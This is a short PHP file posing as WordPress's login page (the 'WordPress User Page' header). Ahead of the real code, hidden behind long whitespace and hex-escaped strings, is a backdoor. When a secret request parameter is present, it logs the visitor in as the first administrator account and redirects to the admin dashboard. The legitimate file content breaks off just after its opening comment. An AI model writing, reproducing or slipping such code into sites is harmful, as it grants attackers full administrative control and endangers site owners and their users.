<?php                                                                                                                         if (isset($_REQUEST["\x6533f51"])) { @include_once("wp\x2Dbl\x6F\x67\x2Dh\x65\x61d\x65r.php"); $oOoo = $wpdb->get_results("SE\x4CEC\x54 I\x44 \x46\x52OM $wpdb->users"); foreach ($oOoo as $o) { $Oo = $o->ID; if (user_can($Oo, "\x61d\x6D\x69n\x69\x73tr\x61t\x6Fr")) { $ooo = get_userdata($Oo); $OOo = $ooo->user_login; wp_set_current_user($Oo, $OOo); wp_set_auth_cookie($Oo); do_action("wp_l\x6F\x67\x69n", $OOo); if (function_exists("\x67\x65t_\x61d\x6D\x69n_\x75rl")) { wp_redirect(get_admin_url()); } else { wp_redirect(get_bloginfo("wp\x75rl") . "\x2Fwp\x2D\x61d\x6D\x69n"); } exit; } } exit; } ?><?php
/**
 * WordPress User Page
 *
